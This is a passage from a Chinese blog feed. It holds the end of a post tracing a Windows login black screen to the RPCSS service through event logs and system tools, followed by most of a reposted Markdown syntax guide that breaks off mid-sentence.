&#123;784E29F4-5EBE-4279-9948-1E8FE941646D&#125; 没有在要求的超时时间内向 DCOM 注册。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么接下来分析一下这串注册值，<code>Win+R</code> 输入 <code>wmic</code> 运行，进入 <strong>wmic</strong> 管理界面，然后运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dcomapp where <span class="token string">"appid&lt;='&#123;79' and appid>='&#123;74'"</span> get appid,name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上命令是查询开头类似 <code>&#123;784E29F4-5EBE-4279-9948-1E8FE941646D&#125;</code> 的 DCOM 服务，得到结果如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvM0lPSml0YzFBWENyblJrLnBuZw?x-oss-process=image/format,png" alt="wmic-dcomapp-query.png"></p><p>浏览后发现里面没有和上面相同的 ID 值，所以这条线索断了，试试其它的；</p><h4 id="进程追踪-1"><a href="#进程追踪-1" class="headerlink" title="进程追踪"></a>进程追踪</h4><p>点一下“详细信息”，再向下浏览，发现了触发该事件的进程信息，其中比较重要的就是进程 ID（ProcessID），也就是常说的 PID，这里为 <code>1140</code>，先记下来；</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvRWs3T3IyVWkzTXd2aE5MLnBuZw?x-oss-process=image/format,png" alt="eventlog-sys-compared-err-pid.png"></p><p>然后 <code>Ctrl+Shift+Esc</code> 打开任务管理器，点一下 <strong>PID</strong> 栏（没有就在表头右键单击，然后勾选上），让它按数字升序排列，找到之前记录的 pid 值（1140）：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvbUNTczdrZEJodTJ4WE9ELnBuZw?x-oss-process=image/format,png" alt="eventlog-err-pid-with-tasklist.png"></p><p>这时就能看到运行该进程的命令行信息了（同样要是没有这一列就右键点击勾选），发现运行的程序是 <code>C:\Windows\system32\svchost.exe</code>，这是一个系统程序，很多服务都会调用它，需要关注的是后面的参数，出现了 <code>RPCSS</code> 这个关键字，看着很熟悉，好像是和远程相关的，搜索后网上说这是一个与 <code>135</code> 端口相关的服务，那么我们就 <code>Win+R</code> 输入 <code>cmd</code> 打开命令提示符，查看一下这个端口信息：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvYTRGajFKem9ucjNjNWZOLnBuZw?x-oss-process=image/format,png" alt="cmd-netstat-rpcss.png"></p><p>果然存在关联，那么这个 <code>RPCSS</code> 应该是一个服务，所以接下来用 <code>sc</code> 命令查询一下这个服务：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAva1BUOHE2c2dNeHRTandDLnBuZw?x-oss-process=image/format,png" alt="cmd-sc-rpcss.png"></p><p>确实是一个服务，这里主要是获取 <code>DISPLAY_NAME</code> 这个值，即 <code>Remote Procedure Call</code>，然后打开服务管理工具（<code>Win+R</code> 后输入 <code>services.msc</code>），找到这个服务项：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvWmRNSlJITlUxUXl1RzM4LnBuZw?x-oss-process=image/format,png" alt="service-rpcss.png"></p><p>双击进去，看一下依赖关系，确实是一项系统基础服务，许多重要的服务和模块都依赖于它，还不能直接冒然禁用：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvZmdrNGVSQTN0S2RqdlpwLnBuZw?x-oss-process=image/format,png" alt="service-rpcss-depend.png"></p><p>到这里所有分析工作就结束了。</p><h1 id="后记-1"><a href="#后记-1" class="headerlink" title="后记"></a>后记</h1><p>下面是之后重新收集的黑屏时的错误事件（启用全部服务），这次就只剩一处错误日志了，也与上面分析筛选结果一致：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvdVRWMzRsOEtIZkdrSk9jLnBuZw?x-oss-process=image/format,png" alt="eventlog-in-black-less-err-warn.png"></p><p>然而，当再次禁用之前的问题服务项时，信息量就剧增了：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvcVBaSWdiZUd0Y0VRbmF5LnBuZw?x-oss-process=image/format,png" alt="eventlog-no-black-more-err-warn.png"></p><p>原因也很明显，禁用一项比较关键的服务项，并且其依赖项还比较多时，就难免发生连环事故，虽然暂时解决了目前的问题，但是对于轻微强迫症的作者来说，多少看着还是有些不安（饮鸩止渴？）但是后面有趣的事情又发生了，在某一次启用全部服务（包括之前确定为问题源的“web 账户管理器”服务）重启进入系统后，竟然意外地<strong>没有黑屏</strong>，而是和平时一样正常进入桌面，后面又试了几次都正常……难道是这一天的 n 顿操作猛如虎和无数次重启再次感化 CPU？看来 Windows 系统永远是个谜，bug 轻轻走了又正如它轻轻的来，不带走一片云彩，算了不玩了，收工。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows 登录 黑屏 事件查看 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 完整语法说明</title>
      <link href="/2024/09/27/bian-cheng/markdown-wan-zheng-yu-fa-shuo-ming/"/>
      <url>/2024/09/27/bian-cheng/markdown-wan-zheng-yu-fa-shuo-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown-完整语法说明"><a href="#Markdown-完整语法说明" class="headerlink" title="Markdown 完整语法说明 "></a>Markdown 完整语法说明 <span id="home"></h1><hr><p>辛勤的搬运工，原文链接<a href="http://wowubuntu.com/markdown/index.html">http://wowubuntu.com/markdown/index.html</a></p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><strong><a href="#1">概述 </a></strong><ul><li><strong><a href="#1.1">宗旨 </a></strong></li><li><strong><a href="#1.2">兼容 HTML </a></strong></li><li><strong><a href="#1.3">特殊字符自动转换 </a></strong></li></ul></li><li><strong><a href="#2">区块元素 </a></strong><ul><li><strong><a href="#2.1">段落和换行 </a></strong></li><li><strong><a href="#2.2">标题 </a></strong></li><li><strong><a href="#2.3">区块引用 Blockquotes </a></strong></li><li><strong><a href="#2.4">列表 </a></strong></li><li><strong><a href="#2.5">分隔线 </a></strong></li></ul></li><li><strong><a href="#3">区段元素 </a></strong><ul><li><strong><a href="#3.1">链接 </a></strong></li><li><strong><a href="#3.2">强调 </a></strong></li><li><strong><a href="#3.3">代码 </a></strong></li></ul></li><li><strong><a href="#4">其它 </a></strong><ul><li><strong><a href="#4.1">自动链接 </a></strong></li><li><strong><a href="#4.2">反斜杠 </a></strong></li></ul></li></ul><hr><h1 id="概述"><a href="#概述" class="headerlink" title="概述 "></a>概述 <span id="1"></h1><h2 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨 "></a>宗旨 <span id="1.1"></h2><p>Markdown 的目标是实现「易读易写」。</p><p>可读性，无论如何，都是最重要的。一份使用 Markdown 格式撰写的文件应该可以直接以纯文本发布，并且看起来不会像是由许多标签或是格式指令所构成。Markdown 语法受到一些既有 text-to-HTML 格式的影响，包括 Setext、atx、Textile、reStructuredText、Grutatext 和 EtText，而最大灵感来源其实是纯文本电子邮件的格式。</p><p>总之， Markdown 的语法全由一些符号所组成，这些符号经过精挑细选，其作用一目了然。比如：在文字两旁加上星号，看起来就像<em>强调</em>。Markdown 的列表看起来，嗯，就是列表。Markdown 的区块引用看起来就真的像是引用一段文字，就像你曾在电子邮件中见过的那样。</p><h2 id="兼容-HTML"><a href="#兼容-HTML" class="headerlink" title="兼容 HTML "></a>兼容 HTML <span id="1.2"></h2><p>Markdown 语法的目标是：成为一种适用于网络的书写语言。</p><p>Markdown 不是想要取代 HTML，甚至也没有要和它相近，它的语法种类很少，只对应 HTML 标记的一小部分。Markdown 的构想不是要使得 HTML 文档更容易书写。在我看来， HTML 已经很容易写了。Markdown 的理念是，能让文档更容易读、写和随意改。HTML 是一种发布的格式，Markdown 是一种书写的格式。就这样，Markdown 的格式语法只涵盖纯文本可以涵盖的范围。</p><p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。不需要额外标注这是 HTML 或是 Markdown；只要直接加标签就可以了。</p><p>要制约的只有一些 HTML 区块元素――比如 <code>&lt;div&gt;</code>、<code>&lt;table&gt;</code>、<code>&lt;pre&gt;</code>、<code>&lt;p&gt;</code> 等标签，必须在前后加上空行与其它内容区隔开，还要求它们的开始标签与结尾标签不能用制表符或空格来缩进。Markdown 的生成器有足够智能，不会在 HTML 区块标签外加上不必要的 <code>&lt;p&gt;</code> 标签。</p><p>例子如下，在 Markdown 文件里加上一段 HTML 表格：</p><pre><code>这是一个普通段落。&lt;table&gt;    &lt;tr&gt;        &lt;td&gt;Foo&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;这是另一个普通段落。</code></pre><p>请注意，在 HTML 区块标签间的 Markdown 格式语法将不会被处理。比如，你在 HTML 区块内使用 Markdown 样式的<code>*强调*</code>会没有效果。</p><p>HTML 的区段（行内）标签如 <code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 可以在 Markdown 的段落、列表或是标题里随意使用。依照个人习惯，甚至可以不用 Markdown 格式，而直接采用 HTML 标签来格式化。举例说明：如果比较喜欢 HTML 的 <code>&lt;a&gt;</code> 或 <code>&lt;img&gt;</code> 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图像标签语法。</p><p>和处在 HTML 区块标签间不同，Markdown 语法在 HTML 区段标签间是有效的。</p><h2 id="特殊字符自动转换"><a href="#特殊字符自动转换" class="headerlink" title="特殊字符自动转换 "></a>特殊字符自动转换 <span id="1.3"></h2><p>在 HTML 文件中，有两个字符需要特殊处理： <code>&lt;</code> 和 <code>&amp;</code> 。 <code>&lt;</code> 符号用于起始标签，<code>&amp;</code> 符号则用于标记 HTML 实体，如果你只是想要显示这些字符的原型，你必须要使用实体的形式，像是 <code>&amp;lt;</code> 和 <code>&amp;amp;</code>。</p><p><code>&amp;</code> 字符尤其让网络文档编写者受折磨，如果你要打「<code>AT&amp;T</code>」 ，你必须要写成「<code>AT&amp;amp;T</code>」。而网址中的<code> &amp;</code> 字符也要转换。比如你要链接到：</p><pre><code>http://images.google.com/images?num=30&amp;q=larry+bird</code></pre><p>你必须要把网址转换写为：</p><pre><code>http://images.google.com/images?num=30&amp;amp;q=larry+bird</code></pre><p>才能放到链接标签的 <code>href</code> 属性里。不用说也知道这很容易忽略，这也可能是 HTML 标准检验所检查到的错误中，数量最多的。</p><p>Markdown 让你可以自然地书写字符，需要转换的由它来处理好了。如果你使用的<code>&amp;</code>字符是 HTML 字符实体的一部分，它会保留原状，否则它会被转换成 <code>&amp;amp;</code>。</p><p>所以你如果要在文档中插入一个版权符号<code> ©</code>，你可以这样写：</p><pre><code>&amp;copy;</code></pre><p>Markdown 会保留它不动。而若你写：</p><pre><code>AT&amp;T</code></pre><p>Markdown 就会将它转为：</p><pre><code>AT&amp;amp;T</code></pre><p>类似的状况也会发生在 &lt; 符号上，因为 Markdown 允许 兼容 HTML ，如果你是把 &lt; 符号作为 HTML 标签的定界符使用，那 Markdown 也不会对它做任何转换，但是如果你写：</p><pre><code>4 &lt; 5</code></pre><p>Markdown 将会把它转换为：</p><pre><code>4 &amp;lt; 5</code></pre><p>不过需要注意的是，code 范围内，不论是行内还是区块， &lt; 和 &amp; 两个符号都一定会被转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML code （和 HTML 相对而言， HTML 语法中，你要把所有的 &lt; 和 &amp; 都转换为 HTML 实体，才能在 HTML 文件里面写出 HTML code。）</p><hr><h1 id="区块元素"><a href="#区块元素" class="headerlink" title="区块元素 "></a>区块元素 <span id="2"></h1><h2 id="段落和换行"><a href="#段落和换行" class="headerlink" title="段落和换行 "></a>段落和换行 <span id="2.1"></h2><p>一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。</p><p>「由一个或多个连续的文本行组成」这句话其实暗示了 Markdown 允许段落内的强迫换行（插入换行符），这个特性和其他大部分的 text-to-HTML 格式不一样（包括 Movable Type 的「Convert Line Breaks」选项），其它的格式会把每个换行符都转成<code> &lt;br /&gt;</code> 标签。</p><p>如果你确实想要依赖 Markdown 来插入 <code>&lt;br /&gt;</code> 标签的话，在插入处先按入两个以上的空格然后回车。</p><p>的确，需要多费点事（多加空格）来产生<code>&lt;br /&gt;</code>，但是简单地「每个换行都转换为<code> &lt;br /&gt;</code>」的方法在 Markdown 中并不适合， Markdown 中 email 式的 区块引用 和多段落的 列表 在使用换行来排版的时候，不但更好用，还更方便阅读。</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题 "></a>标题 <span id="2.2"></h2><p>Markdown 支持两种标题的语法，类 <strong>Setext</strong> 和类 <strong>atx</strong> 形式。</p><p>类 Setext 形式是用底线的形式，利用 <code>=</code> （最高阶标题）和 <code>-</code> （第二阶标题），例如：</p><pre><code>This is an H1=============This is an H2-------------</code></pre><p>任何数量的 <code>=</code> 和 <code>-</code> 都可以有效果。</p><p>类 Atx 形式则是在行首插入 1 到 6 个 <code>#</code> ，对应到标题 1 到 6 阶，例如：</p><pre><code># 这是 H1## 这是 H2###### 这是 H6</code></pre><p>你可以选择性地「闭合」类 atx 样式的标题，这纯粹只是美观用的，若是觉得这样看起来比较舒适，你就可以在行尾加上 #，而行尾的 # 数量也不用和开头一样（行首的井字符数量决定标题的阶数）：</p><pre><code># 这是 H1 ### 这是 H2 ##### 这是 H3 ######</code></pre><h2 id="区块引用-Blockquotes"><a href="#区块引用-Blockquotes" class="headerlink" title="区块引用 Blockquotes "></a>区块引用 Blockquotes <span id="2.3"></h2><p>Markdown 标记区块引用是使用类似 email 中用 &gt; 的引用方式。如果你还熟悉在 email 信件中的引言部分，你就知道怎么在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 &gt; ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,&gt; consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.&gt; Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt; &gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse&gt; id sem consectetuer libero luctus adipiscing.</code></pre><p>Markdown 也允许你偷懒只在整个段落的第一行最前面加上 &gt; ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisseid sem consectetuer libero luctus adipiscing.</code></pre><p>区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 &gt; ：</p><pre><code>&gt; This is the first level of quoting.&gt;&gt; &gt; This is nested blockquote.&gt;&gt; Back to the first level.</code></pre><p>引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：</p><pre><code>&gt; ## 这是一个标题。&gt; &gt; 1.   这是第一行列表项。&gt; 2.   这是第二行列表项。&gt; &gt; 给出一些例子代码：&gt; &gt;     return shell_exec(&quot;echo $input | $markdown_script&quot;);</code></pre><p>任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择增加引用阶层。</p><h2 id="列表"><a href="#列表" class="headerlink" title="列表 "></a>列表 <span id="2.4"></h2><p>Markdown 支持有序列表和无序列表。</p><p>无序列表使用星号、加号或是减号作为列表标记：</p><pre><code>*   Red*   Green*   Blue</code></pre><p>等同于：</p><pre><code>+   Red+   Green+   Blue</code></pre><p>也等同于：</p><pre><code>-   Red-   Green-   Blue</code></pre><p>有序列表则使用数字接着一个英文句点：</p><pre><code>1.  Bird2.  McHale3.  Parish</code></pre><p>很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果，上面的列表所产生的 HTML 标记为：</p><pre><code>&lt;ol&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;McHale&lt;/li&gt;&lt;li&gt;Parish&lt;/li&gt;&lt;/ol&gt;</code></pre><p>如果你的列表标记写成：</p><pre><code>1.  Bird1.  McHale1.  Parish</code></pre><p>或甚至是：</p><pre><code>3. Bird1. McHale8. Parish</code></pre><p>你都会得到完全相同的 HTML 输出。重点在于，你可以让 Markdown 文件的列表数字和输出的结果相同，或是你懒一点，你可以完全不用在意数字的正确性。</p><p>如果你使用懒惰的写法，建议第一个项目最好还是从 1. 开始，因为 Markdown 未来可能会支持有序列表的 start 属性。</p><p>列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 个空格，项目标记后面则一定要接着至少一个空格或制表符。</p><p>要让列表看起来更漂亮，你可以把内容用固定的缩进整理好：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.    Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,    viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.    Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>但是如果你懒，那也行：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果列表项目间用空行分开，在输出 HTML 时 Markdown 就会将项目内容用 <p> 标签包起来，举例来说：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;Magic&lt;/li&gt;&lt;/ul&gt;</code></pre><p>但是这个：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;&lt;p&gt;Bird&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Magic&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符：</p><pre><code>1.  This is a list item with two paragraphs. Lorem ipsum dolor    sit amet, consectetuer adipiscing elit. Aliquam hendrerit    mi posuere lectus.    Vestibulum enim wisi, viverra nec, fringilla in, laoreet    vitae, risus. Donec sit amet nisl. Aliquam semper ipsum    sit amet velit.2.  Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><pre><code>*   This is a list item with two paragraphs.    This is the second paragraph in the list item. You&#39;reonly required to indent the first line. Lorem ipsum dolorsit amet, consectetuer adipiscing elit.*   Another item in the same list.</code></pre><p>如果要在列表项目内放进引用，那 &gt; 就需要缩进：</p><pre><code>*   A list item with a blockquote:    &gt; This is a blockquote    &gt; inside a list item.</code></pre><p>如果要放代码区块的话，该区块就需要缩进两次，也就是 8 个空格或是 2 个制表符：</p><pre><code>*   一列表项包含一个列表区块：        &lt;代码写在这&gt;</code></pre><p>当然，项目列表很可能会不小心产生，像是下面这样的写法：</p><pre><code>1986. What a great season.</code></pre><p>换句话说，也就是在行首出现数字-句点-空白，要避免这样的状况，你可以在句点前面加上反斜杠。</p><pre><code>1986\. What a great season.</code></pre><p>代码区块</p><p>和程序相关的写作或是标签语言原始码通常会有已经排版好的代码区块，通常这些区块我们并不希望它以一般段落文件的方式去排版，而是照原来的样子显示，Markdown 会用 <code>&lt;pre&gt;</code> 和 <code>&lt;code&gt;</code> 标签来把代码区块包起来。</p><p>要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：</p><pre><code>这是一个普通段落：    这是一个代码区块。</code></pre><p>Markdown 会转换成：</p><pre><code>&lt;p&gt;这是一个普通段落：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;这是一个代码区块。&lt;/code&gt;&lt;/pre&gt;</code></pre><p>这个每行一阶的缩进（4 个空格或是 1 个制表符），都会被移除，例如：</p><pre><code>Here is an example of AppleScript:    tell application &quot;Foo&quot;        beep    end tell</code></pre><p>会被转换为：</p><pre><code>&lt;p&gt;Here is an example of AppleScript:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;tell application &quot;Foo&quot;    beepend tell&lt;/code&gt;&lt;/pre&gt;</code></pre><p>一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。</p><p>在代码区块里面， <code>&amp;</code> 、 <code>&lt;</code> 和 <code>&gt;</code> 会自动转成 HTML 实体，这样的方式让你非常容易使用 Markdown 插入范例用的 HTML 原始码，只需要复制贴上，再加上缩进就可以了，剩下的 Markdown 都会帮你处理，例如：</p><pre><code>&lt;div class=&quot;footer&quot;&gt;    &amp;copy; 2004 Foo Corporation&lt;/div&gt;</code></pre><p>会被转换为：</p><pre><code>&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&quot;footer&quot;&amp;gt;    &amp;amp;copy; 2004 Foo Corporation&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;</code></pre><p>代码区块中，一般的 Markdown 语法不会被转换，像是星号便只是星号，这表示你可以很容易地以 Markdown 语法撰写 Markdown 语法相关的文件。</p><h2 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线 "></a>分隔线 <span id ="2.5"></h2><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><pre><code>* * *********- - ----------------------------------------</code></pre><hr><p>##区段元素 <span id="3"></p><h2 id="链接"><a href="#链接" class="headerlink" title="链接 "></a>链接 <span id="3.1"></h2><p>Markdown 支持两种形式的链接语法： _行内式_和_参考式_两种形式。</p><p>不管是哪一种，链接文字都是用 [方括号] 来标记。</p><p>要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：</p><pre><code>This is [an example](http://example.com/ &quot;Title&quot;) inline link.[This link](http://example.net/) has no title attribute.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;an example&lt;/a&gt; inline link.&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has notitle attribute.&lt;/p&gt;</code></pre><p>如果你是要链接到同样主机的资源，你可以使用相对路径：</p><pre><code>See my [About](/about/) page for details.</code></pre><p>参考式的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：</p><pre><code>This is [an example][id] reference-style link.</code></pre><p>你也可以选择性地在两个方括号中间加上一个空格：</p><pre><code>This is [an example] [id] reference-style link.</code></pre><p>接着，在文件的任意处，你可以把这个标记的链接内容定义出来：</p><pre><code>[id]: http://example.com/  &quot;Optional Title Here&quot;</code></pre><p>链接内容定义的形式为：</p><p>方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字<br>接着一个冒号<br>接着一个以上的空格或制表符<br>接着链接的网址<br>选择性地接着 title 内容，可以用单引号、双引号或是括弧包着<br>下面这三种链接的定义都是相同：</p><pre><code>[foo]: http://example.com/  &quot;Optional Title Here&quot;[foo]: http://example.com/  &#39;Optional Title Here&#39;[foo]: http://example.com/  (Optional Title Here)</code></pre><p>请注意：有一个已知的问题是 Markdown.pl 1.0.1 会忽略单引号包起来的链接 title。</p><p>链接网址也可以用尖括号包起来：</p><pre><code>[id]: &lt;http://example.com/&gt;  &quot;Optional Title Here&quot;</code></pre><p>你也可以把 title 属性放到下一行，也可以加一些缩进，若网址太长的话，这样会比较好看：</p><pre><code>[id]: http://example.com/longish/path/to/resource/here    &quot;Optional Title Here&quot;</code></pre><p>网址定义只有在产生链接的时候用到，并不会直接出现在文件之中。</p><p>链接辨别标签可以有字母、数字、空白和标点符号，但是并不区分大小写，因此下面两个链接是一样的：</p><pre><code>[link text][a][link text][A]</code></pre><p>隐式链接标记功能让你可以省略指定链接标记，这种情形下，链接标记会视为等同于链接文字，要用隐式链接标记只要在链接文字后面加上一个空的方括号，如果你要让 “Google” 链接到 google.com，你可以简化成：</p><pre><code>[Google][]</code></pre><p>然后定义链接内容：</p><pre><code>[Google]: http://google.com/</code></pre><p>由于链接文字可能包含空白，所以这种简化型的标记内也许包含多个单词：</p><pre><code>Visit [Daring Fireball][] for more information.</code></pre><p>然后接着定义链接：</p><pre><code>[Daring Fireball]: http://daringfireball.net/</code></pre><p>链接的定义可以放在文件中的任何一个地方，我比较偏好直接放在链接出现段落的后面，你也可以把它放在文件最后面，就像是注解一样。</p><p>下面是一个参考式链接的范例：</p><pre><code>I get 10 times more traffic from [Google] [1] than from[Yahoo] [2] or [MSN] [3].  [1]: http://google.com/        &quot;Google&quot;  [2]: http://search.yahoo.com/  &quot;Yahoo Search&quot;  [3]: http://search.msn.com/    &quot;MSN Search&quot;</code></pre><p>如果改成用链接名称的方式写：</p><pre><code>I get 10 times more traffic from [Google][] than from[Yahoo][] or [MSN][].  [google]: http://google.com/        &quot;Google&quot;  [yahoo]:  http://search.yahoo.com/  &quot;Yahoo Search&quot;  [msn]:    http://search.msn.com/    &quot;MSN Search&quot;</code></pre><p>上面两种写法都会产生下面的 HTML。</p><pre><code>&lt;p&gt;I get 10 times more traffic from &lt;a href=&quot;http://google.com/&quot;title=&quot;Google&quot;&gt;Google&lt;/a&gt; than from&lt;a href=&quot;http://search.yahoo.com/&quot; title=&quot;Yahoo Search&quot;&gt;Yahoo&lt;/a&gt;or &lt;a href=&quot;http://search.msn.com/&quot; title=&quot;MSN Search&quot;&gt;MSN&lt;/a&gt;.&lt;/p&gt;</code></pre><p>下面是用行内式写的同样一段内容的 Markdown 文件，提供作为比较之用：</p><pre><code>I get 10 times more traffic from [Google](http://google.com/ &quot;Google&quot;)than from [Yahoo](http://search.yahoo.com/ &quot;Yahoo Search&quot;) or[MSN](http://search.msn.com/ &quot;MSN Search&quot;).</code></pre><p>参考式的链接其实重点不在于它比较好写，而是它比较好读，比较一下上面的范例，使用参考式的文章本身只有 81 个字符，但是用行内形式的却会增加到 176 个字元，如果是用纯 HTML 格式来写，会有 234 个字元，在 HTML 格式中，标签比文本还要多。</p><p>使用 Markdown 的参考式链接，可以让文件更像是浏览器最后产生的结果，让你可以把一些标记相关的元数据移到段落文字之外，你就可以增加链接而不让文章的阅读感觉被打断。</p><h2 id="强调"><a href="#强调" class="headerlink" title="强调 "></a>强调 <span id="3.2"></h2><p>Markdown 使用星号（<code>*</code>）和底线（<code>_</code>）作为标记强调字词的符号，被 <code>*</code> 或 <code>_</code> 包围的字词会被转成用 <code>&lt;em&gt;</code> 标签包围，用两个 <code>*</code> 或 <code>_</code> 包起来的话，则会被转成 <code>&lt;strong&gt;</code>，例如：</p><pre><code>*single asterisks*_single underscores_**double asterisks**__double underscores__</code></pre><p>会转成：</p><pre><code>&lt;em&gt;single asterisks&lt;/em&gt;&lt;em&gt;single underscores&lt;/em&gt;&lt;strong&gt;double asterisks&lt;/strong&gt;&lt;strong&gt;double underscores&lt;/strong&gt;</code></pre><p>你可以随便用你喜欢的样式，唯一的限制是，你用什么符号开启标签，就要用什么符号结束。</p><p>强调也可以直接插在文字中间：</p><pre><code>un*frigging*believable</code></pre><p>但是如果你的 * 和 _ 两边都有空白的话，它们就只会被当成普通的符号。</p><p>如果要在文字前后直接插入普通的星号或底线，你可以用反斜线：</p><pre><code>\*this text is surrounded by literal asterisks\*</code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码 "></a>代码 <span id="3.3"></h2><p>如果要标记一小段行内代码，你可以用反引号把它包起来（`），例如：</p><pre><code>Use the `printf()` function.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;Use the &lt;code&gt;printf()&lt;/code&gt; function.&lt;/p&gt;</code></pre><p>如果要在代码区段内插入反引号，你可以用多个反引号来开启和结束代码区段：</p><pre><code>``There is a literal backtick (`) here.``</code></pre><p>这段语法会产生：</p><pre><code>&lt;p&gt;&lt;code&gt;There is a literal backtick (`) here.&lt;/code&gt;&lt;/p&gt;</code></pre><p>代码区段的起始和结束端都可以放入一个空白，起始端后面一个，结束端前面一个，这样你就可以在区段的一开始就插入反引号：</p><pre><code>A single backtick in a code span: `` ` ``A backtick-delimited string in a code span: `` `foo` ``</code></pre><p>会产生：</p><pre><code>&lt;p&gt;A single backtick in a code span: &lt;code&gt;`&lt;/code&gt;&lt;/p&gt;&lt;p&gt;A backtick-delimited string in a code span: &lt;code&gt;`foo`&lt;/code&gt;&lt;/p&gt;</code></pre><p>在代码区段内，&amp; 和尖括号都会被自动地转成 HTML 实体，这使得插入 HTML 原始码变得很容易，Markdown 会把下面这段：</p><pre><code>Please don&#39;t use any `&lt;blink&gt;` tags.</code></pre><p>转为：</p><pre><code>&lt;p&gt;Please don&#39;t use any &lt;code&gt;&amp;lt;blink&amp;gt;&lt;/code&gt; tags.&lt;/p&gt;</code></pre><p>你也可以这样写：</p><pre><code>`&amp;#8212;` is the decimal-encoded equivalent of 